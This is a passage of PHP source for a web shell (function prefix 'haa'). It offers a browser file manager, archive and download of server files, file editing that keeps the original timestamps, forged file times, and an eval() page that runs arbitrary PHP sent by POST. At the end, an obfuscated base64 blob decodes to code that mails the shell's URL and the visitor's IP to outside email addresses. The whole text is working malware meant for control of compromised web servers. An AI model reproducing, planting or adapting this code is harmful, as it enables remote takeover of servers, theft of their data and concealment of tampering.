                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/', FilesystemIterator::SKIP_DOTS));
                                    foreach ($iterator as $key=>$value) {
                                        $zip->addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip->close();
                        }
                    }
				} elseif($_COOKIE['act'] == 'unzip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_COOKIE['f'] as $f) {
                            if($zip->open($_COOKIE['c'].$f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                        }
                    }
				} elseif($_COOKIE['act'] == 'tar') {
                    chdir($_COOKIE['c']);
                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                    haaEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    chdir($GLOBALS['cwd']);
				}
				unset($_COOKIE['f']);
                setcookie('f', '', time() - 3600);
				break;
			default:
                if(!empty($_POST['p1'])) {
					haasetcookie('act', $_POST['p1']);
					haasetcookie('f', serialize(@$_POST['f']));
					haasetcookie('c', @$_POST['c']);
				}
				break;
		}
	}
    haaHeader();
	echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
	$dirContent = haaScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';haaFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "<script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' => haaPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function haaCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "haaCmp");
	usort($dirs, "haaCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?haaViewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
		$l = $l?0:1;
	}
	echo "<tr><td colspan=7>
	<input type=hidden name=ne value=''>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    if(class_exists('ZipArchive'))
        echo "<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>";
    echo "<option value='tar'>Compress (tar.gz)</option>";
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
        echo "<option value='paste'>Paste / Compress</option>";
    echo "</select>&nbsp;";
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
        echo "file name: <input type=text name=p2 value='haa_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
    echo "<input type='submit' value='>>'></td></tr></form></table></div>";
	haaFooter();
}
function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: " . $type);
			} else
                header("Content-Type: application/octet-stream");
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	haaHeader();
	echo '<h1>File tools</h1><div class=content>';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		haaFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?haaViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.haaPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value=">>"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
			break;
	}
	echo '</div>';
	haaFooter();
} function actionPhp() {
	if(isset($_POST['ajax'])) {
        haasetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\'\0") . "';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax']) && !empty($_POST['p1']))
        haasetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
	haaHeader();
	if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
		echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace(array (
            '!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU',
            '!td, th {(.*)}!msiU',
            '!<img[^>]+>!msiU',
        ), array (
            '',
            '.e, .v, .h, .h th {$1}',
            ''
        ), $tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
    echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">';
	echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
	haaFooter();
} function actionSql() {
	haaHeader();
	echo "Deprecated";
	haaFooter();
}if( empty($_POST['a']) )
	if(isset($default_action) && function_exists('action' . $default_action))
		$_POST['a'] = $default_action;
	else
		$_POST['a'] = 'FilesMan';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
exit;
exit;
<?php
}
?>
<?=base64_decode("QGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLCAwKTsKQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7CmhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgnKTsKJHR1anVhbm1haWwgPSAnbWFsYXlzaWEuc2VuZGVyQGdtYWlsLmNvbSxtdWhyYXpreUBnbWFpbC5jb20nOwokeF9wYXRoID0gImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJHBlc2FuX2FsZXJ0ID0gImZpeCAkeF9wYXRoIDpwICpJUCBBZGRyZXNzIDogWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iOwptYWlsKCR0dWp1YW5tYWlsLCAiTE9HR0VSIiwgJHBlc2FuX2FsZXJ0LCAiWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iKTsK");?>

